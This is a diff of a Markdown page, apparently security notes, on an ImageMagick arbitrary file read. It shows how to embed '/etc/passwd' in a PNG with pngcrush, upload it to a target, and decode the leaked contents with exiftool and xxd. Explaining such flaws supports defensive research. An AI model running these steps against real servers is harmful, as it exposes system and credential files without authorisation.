@@ -73,8 +73,7 @@ uid=1001(user) gid=1001(user) groups=1001(user)
 
 [This writeup](https://www.metabaseq.com/imagemagick-zero-days/) explains a vulnerability in ImageMagick that allowed an input file to contain malicious **metadata** including a **filename**, and the output file would **contain the content** of that file on the remote server. Exploiting it is very simple:
 
-1.  **Create the file**: Take any PNG file, and add a `profile` `tEXt` chunk to it with a filename that is the file you wish to read:\
-
+1.  **Create the file**: Take any PNG file, and add a `profile` `tEXt` chunk to it with a filename that is the file you wish to read:<br>
 
     <pre class="language-shell-session"><code class="lang-shell-session"><strong>$ pngcrush -text a 'profile' '/etc/passwd' example.png
     </strong>CPU time decode 0.000000, encode 0.000000, other 0.000000, total 0.000002 sec
@@ -87,17 +86,11 @@ uid=1001(user) gid=1001(user) groups=1001(user)
     </strong><strong>00000050: 7764 00b7 f46d 9c00 0000 0049 454e 44ae  wd...m.....IEND.
     </strong>00000060: 4260 82                                  B`.
     </code></pre>
-2.  **Upload the file** to your target so ImageMagick will parse it\
+2.  **Upload the file** to your target so ImageMagick will parse it<br>
 
-
-    {% hint style="warning" %}
-    During the conversion, the following warning should appear confirming the vulnerability:
-
-    <pre class="language-bash" data-overflow="wrap"><code class="lang-bash"><strong>keyword "Raw profile type ": bad character '0x20' @ warning/png.c/MagickPNGWarningHandler/1750.
-    </strong></code></pre>
-    {% endhint %}
-3.  **Download the result** and **extract the data**: With the file downloaded, another `tEXt` or `zTXt` (compressed) chunk is added containing the content as data.\
-
+    <div data-gb-custom-block data-tag="hint" data-style="warning" class="hint hint-warning"><p>During the conversion, the following warning should appear confirming the vulnerability:</p><pre class="language-bash" data-overflow="wrap"><code class="lang-bash"><strong>keyword "Raw profile type ": bad character '0x20' @ warning/png.c/MagickPNGWarningHandler/1750.
+    </strong></code></pre></div>
+3.  **Download the result** and **extract the data**: With the file downloaded, another `tEXt` or `zTXt` (compressed) chunk is added containing the content as data.<br>
 
     <pre class="language-shell-session"><code class="lang-shell-session"><strong>$ exiftool -RawProfileType download.png | cut -d '.' -f4- | xxd -p -r
     </strong>root:x:0:0:root:/root:/bin/bash
